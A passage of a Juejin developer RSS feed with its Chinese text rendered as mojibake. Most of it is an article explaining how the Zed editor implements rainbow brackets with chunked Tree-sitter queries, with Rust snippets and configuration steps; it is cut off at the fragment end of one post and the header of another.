æ˜¾å­˜æ›´è´µï¼Œ
åˆ«è®©å®ƒä»¬ç™½ç™½æµªè´¹ã€‚
</code></pre>
<p>å°ç¦¾çœ‹ç€ nvidia-smi æ˜¾ç¤ºçš„ 2GB å ç”¨ï¼Œå¿ƒæƒ…èˆ’ç•…ã€‚</p>
<p>ç»ˆäºå¯ä»¥æ”¾å¿ƒåœ°é‡å¯æœåŠ¡äº†ã€‚</p>
<hr/>
<p><strong>ä¸‹ä¸€ç¯‡é¢„å‘Šï¼šæ¥å£æŠ¥ 500 äº†ï¼Œæ—¥å¿—é‡Œå´å•¥éƒ½æ²¡æœ‰</strong></p>
<blockquote>
<p>æ‰¾äº†ä¸‰å°æ—¶çš„ bugï¼ŒåŸæ¥æ˜¯å¼‚å¸¸è¢«åäº†ã€‚</p>
</blockquote>
<p>æ•¬è¯·æœŸå¾…ã€‚</p>
<hr/>
<p><code>#FastAPI</code> <code>#Python</code> <code>#GPU</code> <code>#æ˜¾å­˜ç®¡ç†</code> <code>#ç”Ÿå‘½å‘¨æœŸ</code> <code>#AIåº”ç”¨</code></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zed æ­£å¼ä¸Šçº¿ã€Œå½©è™¹æ‹¬å·ã€â€”â€” æ‹¬å·åœ°ç‹±ç»ˆç»“è€…æ¥äº†ï¼]]></title>    <link>https://juejin.cn/post/7581698074362150921</link>    <guid>https://juejin.cn/post/7581698074362150921</guid>    <pubDate>2025-12-10T00:42:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074362150921" data-draft-id="7579892134816464931" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zed æ­£å¼ä¸Šçº¿ã€Œå½©è™¹æ‹¬å·ã€â€”â€” æ‹¬å·åœ°ç‹±ç»ˆç»“è€…æ¥äº†ï¼"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-10T00:42:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golangå­¦ä¹ è®°"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zed æ­£å¼ä¸Šçº¿ã€Œå½©è™¹æ‹¬å·ã€â€”â€” æ‹¬å·åœ°ç‹±ç»ˆç»“è€…æ¥äº†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golangå­¦ä¹ è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:42:55.000Z" title="Wed Dec 10 2025 00:42:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    24
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><em>â€œä»¥å‰çœ‹ Lisp ä»£ç åƒè§£æ‘©æ–¯å¯†ç ï¼Œç°åœ¨ï¼Ÿåƒåœ¨çœ‹éœ“è™¹ç¯ç®¡æ­çš„ä¹é«˜ã€‚â€</em><br/>
â€”â€” ä¸€ä½åˆšä» 7 å±‚åµŒå¥—å›è°ƒä¸­é€ƒç”Ÿçš„å‰ç«¯å·¥ç¨‹å¸ˆ</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ğŸ” ä¸€ã€ä»€ä¹ˆæ˜¯ã€Œå½©è™¹æ‹¬å·ã€ï¼Ÿâ€”â€” ç»™æ‹¬å·ç©¿ä¸Šå½©è™¹è¡£</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df3b09bc5a5458687601771be17d188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=HoHmZN8goXfQgizbbROyRxGkul0%3D" alt="å½©è™¹æ‹¬å·æ•ˆæœç¤ºä¾‹ï¼šæ¯å±‚åµŒå¥—ä¸€ä¸ªé¢œè‰²ï¼Œä¸€çœ¼å®šä½åŒ¹é…å…³ç³»" loading="lazy"/></p>
<p>ç®€å•è¯´ï¼š<strong>ä¸åŒåµŒå¥—å±‚çº§çš„æ‹¬å·ï¼Œè‡ªåŠ¨ç”¨ä¸åŒé¢œè‰²é«˜äº®</strong>ã€‚</p>
<p>æ¯”å¦‚è¿™æ®µ Rustï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span> = <span class="hljs-title function_ invoke__">foo</span>(<span class="hljs-title function_ invoke__">bar</span>(<span class="hljs-title function_ invoke__">baz</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">qux</span>()), <span class="hljs-number">3</span>);
}
</code></pre>
<p>â†’ æœ€å¤–å±‚ <code>{ }</code> æ˜¯ <strong>è“è‰²</strong>ï¼Œ<br/>
â†’ <code>foo(â€¦)</code> æ˜¯ <strong>æ©™è‰²</strong>ï¼Œ<br/>
â†’ <code>bar(â€¦)</code> æ˜¯ <strong>ç»¿è‰²</strong>ï¼Œ<br/>
â†’ <code>baz(â€¦)</code> æ˜¯ <strong>ç´«è‰²</strong>â€¦â€¦<br/>
<strong>é¢œè‰²è½®æ¢ï¼Œå±‚çº§åˆ†æ˜</strong>ï¼Œå†ä¹Ÿä¸ç”¨é æ•°æ‹¬å·æˆ–é  IDE é«˜äº®â€œä¸´æ—¶æˆå¯¹â€æ¥çŒœåŒ¹é…å…³ç³»ï¼</p>
<blockquote>
<p>ğŸ’¡ å°çŸ¥è¯†ï¼š<br/>
æ­¤åŠŸèƒ½è¢« Zed ç”¨æˆ·â€œè¹²å®ˆâ€<strong>è¶…è¿‡ 3 å¹´</strong> â€”â€” æ˜¯ Zed å²ä¸Šè¯·æ±‚é‡æœ€é«˜çš„åŠŸèƒ½ ğŸ˜</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">ğŸ› ï¸ äºŒã€æŠ€æœ¯æŒ‘æˆ˜ï¼šä¸ºä»€ä¹ˆâ€œå½©è™¹æ‹¬å·â€æ²¡é‚£ä¹ˆå®¹æ˜“å®ç°ï¼Ÿ</h2>
<p>ä¹ä¸€å¬ï¼šä¸å°±æ˜¯ç»™æ‹¬å·æŸ“ä¸ªè‰²ï¼Ÿ<br/>
ä½†çœŸæ­£è½åœ°ï¼Œè¦è·¨è¿‡ä¸‰åº§å¤§å±±ï¼š</p>





















<table><thead><tr><th>æ–¹æ¡ˆ</th><th>é—®é¢˜</th></tr></thead><tbody><tr><td><strong>ä¾èµ–è¯­è¨€æœåŠ¡å™¨ï¼ˆLSPï¼‰</strong></td><td>LSP åè®®å‹æ ¹æ²¡å®šä¹‰â€œæ‹¬å·é…å¯¹/åµŒå¥—æ·±åº¦â€è¿™ç±»ä¿¡æ¯ï¼›ä¸” 90% çš„è¯­è¨€æœåŠ¡å™¨ä¸æä¾›æ­¤èƒ½åŠ› â†’ âŒ ä¸å¯æ‰©å±•</td></tr><tr><td><strong>ç…§æ¬ VS Code æ–¹æ¡ˆ</strong></td><td>VS Code ä¸ºå®ç°å®ƒï¼Œ<strong>åœ¨å†…å­˜ä¸­ç»´æŠ¤æ•´æ£µè¯­æ³•æ ‘</strong> â†’ å¤§æ–‡ä»¶å¡é¡¿ã€å†…å­˜é£™å‡ â†’ âŒ ä¸é€‚åˆ Zed æ¶æ„</td></tr><tr><td><strong>Zed çš„é€‰æ‹©</strong></td><td>âœ… åªæŸ¥è¯¢<strong>å½“å‰å¯è§åŒºåŸŸ</strong>çš„æ‹¬å·ï¼›âœ… æ‹†æˆå°â€œå—â€ï¼ˆchunksï¼‰æ‡’åŠ è½½ï¼›âœ… å¤ç”¨ç°æœ‰ Tree-sitter æŸ¥è¯¢ä½“ç³»</td></tr></tbody></table>
<blockquote>
<p>ğŸ“Œ å…³é”®æ´å¯Ÿï¼š<br/>
ç”¨æˆ·ä¸éœ€è¦â€œç»å¯¹ç²¾ç¡®â€çš„å…¨å±€åµŒå¥—æ·±åº¦â€”â€”<br/>
åªè¦<strong>å±€éƒ¨è§†è§‰åŒºåˆ†æ¸…æ™°</strong>ï¼Œå“ªæ€•æ·±å¤„åˆ†ç•Œå¤„é¢œè‰²é”™ä¸€ä½ï¼Œ<strong>äººçœ¼ä¹Ÿå‡ ä¹å¯Ÿè§‰ä¸åˆ°</strong>ã€‚<br/>
<strong>â€œå¤Ÿç”¨å°±å¥½â€çš„å·¥ç¨‹å“²å­¦ï¼Œè®©æ€§èƒ½ä¸ä½“éªŒåŒèµ¢ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-2">ğŸŒ² ä¸‰ã€æ ¸å¿ƒæŠ€æœ¯ï¼šTree-sitter + Chunked Query â€”â€” å°è€Œç¾çš„ç»„åˆæ‹³</h2>
<p>Zed æ—©å·²ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Ftree-sitter.github.io%2F" target="_blank" title="https://tree-sitter.github.io/" ref="nofollow noopener noreferrer">Tree-sitter</a> åšè¯­æ³•é«˜äº®ã€å¤§çº²ç”Ÿæˆç­‰ã€‚<br/>
è€Œæ¯ä¸ªè¯­è¨€æ‰©å±•ï¼Œéƒ½è‡ªå¸¦ä¸€ä¸ª <code>brackets.scm</code> æŸ¥è¯¢æ–‡ä»¶ï¼Œæ¯”å¦‚ Rust çš„ï¼š</p>
<pre><code class="hljs language-scheme" lang="scheme">("(" @open ")" @close)
("[" @open "]" @close)
("{" @open "}" @close)
("&lt;" @open "&gt;" @close)
;; â€¦çœç•¥ closure å’Œæ³›å‹
(("\"" @open "\"" @close) (#set! rainbow.exclude))  ; â† è¿™è¡Œå…³é”®ï¼æ’é™¤å­—ç¬¦ä¸²å¼•å·
</code></pre>
<p>ğŸ‘‰ è¿™é‡Œ <code>(#set! rainbow.exclude)</code> å°±æ˜¯<strong>å‘Šè¯‰å½©è™¹æ‹¬å·ï¼šâ€œå¼•å·åˆ«æŸ“è‰²ï¼Œå…å¾—å¹²æ‰°é˜…è¯»â€</strong>ã€‚</p>
<h3 data-id="heading-3">ğŸ§© æ™ºèƒ½åˆ†å—ï¼ˆChunkingï¼‰ï¼šæ€§èƒ½çš„ç§˜å¯†æ­¦å™¨</h3>
<p>Zed ä¸å†â€œå…¨æ–‡ä»¶æ‰«æâ€ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li>
<p>æŠŠç¼“å†²åŒºï¼ˆbufferï¼‰æŒ‰ <strong>50 è¡Œä¸€å—</strong> åˆ’åˆ†ï¼›</p>
</li>
<li>
<p>åªå¯¹<strong>å½“å‰ç¼–è¾‘å™¨å¯è§çš„å—</strong>æ‰§è¡Œ Tree-sitter æ‹¬å·æŸ¥è¯¢ï¼›</p>
</li>
<li>
<p>æ¯å—ç‹¬ç«‹è®¡ç®—åµŒå¥—æ·±åº¦ â†’ <strong>é¢œè‰²é”™ä½é£é™©è¢«é™åˆ¶åœ¨å—è¾¹ç•Œ</strong>ï¼ˆ50 è¡Œ â‰ˆ å±å¹• 1~2 å±ï¼Œå‡ ä¹æ— æ„Ÿï¼‰ï¼›</p>
</li>
<li>
<p>ç¼–è¾‘æ—¶åªæ›´æ–°å˜åŠ¨å—ï¼Œæ»šåŠ¨æ—¶æ‡’åŠ è½½æ–°å—ã€‚</p>
</li>
</ol>
<blockquote>
<p>âœ… ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨ä½ â€”â€” æ— éœ€æ•´æ£µè¯­æ³•æ ‘</li>
<li>å¯åŠ¨å¿« â€”â€” æ»šåŠ¨åˆ°å“ªç®—åˆ°å“ª</li>
<li>è¿œç¨‹å¼€å‘å‹å¥½ â€”â€” å’Œæœ¬åœ°ä¸€è‡´ï¼ˆé  buffer åŒæ­¥ï¼‰</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-4">âš™ï¸ å››ã€æ•°æ®ç»“æ„è®¾è®¡ï¼šæç®€ä½†é«˜æ•ˆ</h2>
<p>æ ¸å¿ƒæ–°å¢ä¸¤ä¸ªå­—æ®µï¼Œæ”¾åœ¨ <code>Buffer</code>ï¼ˆZed çš„æ–‡æ¡£æ¨¡å‹ï¼‰é‡Œï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeSitterData</span> {
    chunks: RowChunks,                 <span class="hljs-comment">// è¡Œå·åˆ†å—ç®¡ç†å™¨</span>
    brackets_by_chunks: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">Option</span>&lt;<span class="hljs-type">Vec</span>&lt;BracketMatch&lt;<span class="hljs-type">usize</span>&gt;&gt;&gt;&gt;,
}
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BracketMatch</span>&lt;T&gt; {
    <span class="hljs-keyword">pub</span> open_range: Range&lt;T&gt;,   <span class="hljs-comment">// å·¦æ‹¬å·ä½ç½®</span>
    <span class="hljs-keyword">pub</span> close_range: Range&lt;T&gt;,  <span class="hljs-comment">// å³æ‹¬å·ä½ç½®</span>
    <span class="hljs-keyword">pub</span> color_index: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">usize</span>&gt;, <span class="hljs-comment">// é¢œè‰²åºå·ï¼š0=è“, 1=æ©™, 2=ç»¿...</span>
}
</code></pre>
<ul>
<li>âœ… <strong>æ•°æ®å­˜åœ¨ Bufferï¼Œä¸åœ¨ Editor</strong> â†’ å¤šçª—å£/åˆ†å±å…±äº«ï¼Œä¸é‡å¤è®¡ç®—</li>
<li>âœ… <strong>ä¿®æ”¹æ—¶ç«‹åˆ»å¤±æ•ˆï¼Œæ¸²æŸ“æ—¶æ‰é‡æŸ¥</strong> â†’ ç¼–è¾‘æµç•…ä¸å¡é¡¿</li>
<li>âœ… <strong>å¤ç”¨ä¸»é¢˜é…è‰²</strong> â†’ 7 ç§â€œå¼ºè°ƒè‰²â€å¾ªç¯ï¼Œè‡ªåŠ¨é€‚é…æ·±è‰²/æµ…è‰²ä¸»é¢˜</li>
</ul>
<hr/>
<h2 data-id="heading-5">ğŸ§ª äº”ã€æµ‹è¯•æ–¹æ³•ä¹Ÿç¡¬æ ¸ï¼šå¯è§†åŒ–æ–­è¨€ + æ·±åº¦åµŒå¥—éªŒè¯</h2>
<p>Zed å›¢é˜Ÿç”¨ä¸€ç§â€œå¯è§†åŒ–æµ‹è¯•æ ‡è®°æ³•â€éªŒè¯å½©è™¹é€»è¾‘ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>Â«<span class="hljs-number">1</span>()<span class="hljs-number">1</span>Â» Â«<span class="hljs-number">1</span>{
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">a</span> = oneÂ«<span class="hljs-number">2</span>(Â«<span class="hljs-number">3</span>()<span class="hljs-number">3</span>Â», Â«<span class="hljs-number">3</span>{ Â«<span class="hljs-number">4</span>()<span class="hljs-number">4</span>Â» }<span class="hljs-number">3</span>Â», Â«<span class="hljs-number">3</span>()<span class="hljs-number">3</span>Â»)<span class="hljs-number">2</span>Â»;
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..a Â«<span class="hljs-number">2</span>{
        <span class="hljs-built_in">println!</span>Â«<span class="hljs-number">3</span>(<span class="hljs-string">"{i}"</span>)<span class="hljs-number">3</span>Â»;
    }<span class="hljs-number">2</span>Â»
}<span class="hljs-number">1</span>Â»
</code></pre>
<p>â†’ <code>Â«nâ€¦nÂ»</code> è¡¨ç¤ºè¯¥å¯¹æ‹¬å·åº”è¢«æ ‡ä¸ºç¬¬ <code>n</code> å·é¢œè‰²ï¼ˆ1~7 å¾ªç¯ï¼‰<br/>
â†’ æµ‹è¯•ç›´æ¥â€œçœ‹å›¾è¯´è¯â€ï¼Œç²¾å‡†éªŒè¯åµŒå¥—é€»è¾‘æ˜¯å¦æ­£ç¡®ï¼</p>
<hr/>
<h2 data-id="heading-6">ğŸ›ï¸ å…­ã€å¦‚ä½•å¼€å¯ï¼Ÿé«˜åº¦å¯å®šåˆ¶ï¼</h2>
<p>é»˜è®¤<strong>å…³é—­</strong>ï¼ˆé¿å…æ‰“æ‰°æ—§ç”¨æˆ·ï¼‰ï¼Œæ‰‹åŠ¨å¼€å¯ï¼š</p>
<ol>
<li><code>Cmd + ,</code> æ‰“å¼€è®¾ç½®</li>
<li>æœç´¢ <code>Colorize Brackets</code></li>
<li>å¯ï¼š
<ul>
<li>âœ… å…¨å±€å¼€å¯ / æŒ‰è¯­è¨€å•ç‹¬å¼€ï¼ˆæ¯”å¦‚åªç»™ Rustã€JS å¼€ï¼‰</li>
<li>âœ… æ’é™¤ç‰¹å®šæ‹¬å·ï¼ˆå¦‚ <code>"</code> <code>'</code>ï¼Œé»˜è®¤å·²æ’é™¤ï¼‰</li>
<li>âœ… é€šè¿‡ä¸»é¢˜å®šåˆ¶ 7 ç§é¢œè‰²</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a294a6dac7e54a2da606ff02390097ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=KzECz8iTIqYLftn4XceeqwaeY6o%3D" alt="Zed è®¾ç½®ç•Œé¢ï¼šColorize Brackets å¼€å…³ä¸è¯­è¨€ç²’åº¦æ§åˆ¶" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">ğŸ”® æœªæ¥å±•æœ›ï¼šä¸æ­¢äº <code>()[]{}</code></h2>
<p>Zed å·²é¢„ç•™æ‰©å±•èƒ½åŠ›ï¼š</p>
<ul>
<li>âœ… <strong>HTML/JSX æ ‡ç­¾é…å¯¹</strong>ï¼ˆ<code>&lt;div&gt;</code> / <code>&lt;/div&gt;</code>ï¼‰æŠ€æœ¯ä¸Šå·²æ”¯æŒï¼Œåªéœ€åœ¨ <code>brackets.scm</code> ä¸­å£°æ˜ â†’ ä¸‹ä¸€ç‰ˆæœ¬æˆ–ç”±ç¤¾åŒºè´¡çŒ®ï¼</li>
<li>âœ… <strong>æ›´å¤š Tree-sitter æŸ¥è¯¢ç¼“å­˜åŒ–</strong>ï¼ˆå¦‚å¤§çº²ã€inlay hintsï¼‰â€”â€” å€Ÿâ€œåˆ†å—ç¼“å­˜â€æ¡†æ¶å¤ç”¨</li>
</ul>
<hr/>
<h2 data-id="heading-8">âœ… æ€»ç»“ï¼šä¸€æ¬¡å…‹åˆ¶è€Œä¼˜é›…çš„å·¥ç¨‹å®è·µ</h2>

























<table><thead><tr><th>ç»´åº¦</th><th>Zed æ–¹æ¡ˆäº®ç‚¹</th></tr></thead><tbody><tr><td><strong>æ€§èƒ½</strong></td><td>åˆ†å—æ‡’åŠ è½½ + Tree-sitter å±€éƒ¨æŸ¥è¯¢ â†’ å¤§æ–‡ä»¶ä¸å¡</td></tr><tr><td><strong>æ¶æ„</strong></td><td>å¤ç”¨ç°æœ‰ <code>brackets.scm</code> + Buffer ç¼“å­˜ â†’ ä½ä¾µå…¥</td></tr><tr><td><strong>ä½“éªŒ</strong></td><td>é¢œè‰²è½®æ¢ + æ’é™¤å¹²æ‰°é¡¹ + ä¸»é¢˜èåˆ â†’ ç¾è§‚ä¸åˆºçœ¼</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>åˆ†å—æ¡†æ¶å¯å¤ç”¨ â†’ ä¸ºæœªæ¥åŠŸèƒ½é“ºè·¯</td></tr></tbody></table>
<blockquote>
<p>ğŸ Zed ç”¨ 3 å¹´æ—¶é—´ï¼ŒæŠŠä¸€ä¸ªâ€œçœ‹ä¼¼ç®€å•â€çš„éœ€æ±‚ï¼Œæ‰“ç£¨æˆ<strong>å…¼é¡¾æ€§èƒ½ã€æ¶æ„ä¸ç”¨æˆ·ä½“éªŒçš„å…¸èŒƒ</strong>ã€‚<br/>
å®ƒå†æ¬¡è¯æ˜ï¼š<strong>å¥½å·¥å…·ï¼Œä¸åœ¨äºå †åŠŸèƒ½ï¼Œè€Œåœ¨äºç”¨å¯¹çš„æ–¹æ³•ï¼Œè§£å†³çœŸå®çš„ç—›ã€‚</strong></p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¸©å‘å®å½•ï¼šå¾®ä¿¡å°ç¨‹åºè¿”å› App å¤±è´¥ï¼Ÿä¸€æ¬¡ `launchMode` å¯¼è‡´çš„ Activity ä»»åŠ¡æ ˆâ€œè¿·èˆªâ€]]></title>    <link>https://juejin.cn/post/7581678032337485866</link>    <guid>https://juejin.cn/post/7581678032337485866</guid>    <pubDate>2025-12-10T02:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581678032337485866" data-draft-id="7581752508780003371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¸©å‘å®å½•ï¼šå¾®ä¿¡å°ç¨‹åºè¿”å› App å¤±è´¥ï¼Ÿä¸€æ¬¡ `launchMode` å¯¼è‡´çš„ Activity ä»»åŠ¡æ ˆâ€œè¿·èˆªâ€"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-10T02:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¸©å‘å®å½•ï¼šå¾®ä¿¡å°ç¨‹åºè¿”å› App å¤±è´¥ï¼Ÿä¸€æ¬¡ `launchMode` å¯¼è‡´çš„ Activity ä»»åŠ¡æ ˆâ€œè¿·èˆªâ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·4165967369355
